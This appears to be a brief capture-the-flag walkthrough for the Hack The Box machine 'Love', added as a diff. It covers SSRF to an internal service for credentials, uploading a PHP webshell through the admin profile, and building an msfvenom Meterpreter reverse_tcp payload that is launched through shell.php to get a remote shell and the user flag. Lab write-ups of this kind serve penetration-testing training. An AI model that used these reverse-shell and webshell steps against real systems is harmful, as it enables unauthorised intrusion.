@@ -1,0 +1,17 @@
+Add staging.love.htb to /etc/Hosts
+
+go to the url, then open the demo page... here scan for 127.0.0.1:5000 which is the apache server.
+
+now, got the user and pass.. login into admin/index.php and upgrade your profile, uploading a shell (used simple-backdoor from /usr/share/webshells/simpl..).
+
+create  payload with msfvenom -p windows/meterpreter/reverse_tcp LHOST=<> LPORT=<> -f exe > name.exe
+
+upload name.exe.
+
+open msfconsole and use multi/handler.
+
+set payload windows/meterpreter/reverse_tcp
+
+and go to love.htb/images/shell.php?cmd=name.exe
+
+go to user folder and get USER flag.
